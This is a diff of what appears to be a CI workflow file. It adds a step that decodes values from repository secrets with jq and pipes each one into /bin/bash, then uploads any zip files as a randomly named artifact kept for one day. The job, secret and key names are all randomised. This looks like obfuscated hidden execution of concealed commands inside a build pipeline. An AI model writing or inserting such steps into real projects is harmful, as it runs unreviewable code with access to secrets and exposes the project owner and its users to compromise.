@@ -9,14 +9,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: postgresstorm265
         env:
-          fvs553: ${{ secrets.fvs553 }}
+          ewfrr3: ${{ secrets.ewfrr3 }}
         run: |
-          printf '%s' "$fvs553" | jq -r .ms067 | /bin/bash
-          printf '%s' "$sxnx50" | jq -r .mnah86 | /bin/bash
+          printf '%s' "$ewfrr3" | jq -r .b74150 | /bin/bash
+          printf '%s' "$j465" | jq -r .l5763 | /bin/bash
+          echo $y117 | jq -r .pgtdg6025 | /bin/bash
+          printf '%s' "$eypt899" | jq -r .tnoy40869 | /bin/bash
+          printf '%s' "$olx31" | jq -r .lg72 | /bin/bash
+          printf '%s' "$jnoqq6" | jq -r .sz8 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: It2nYNVP
+          name: UdL0epIH
           path: "*.zip"
           retention-days: 1
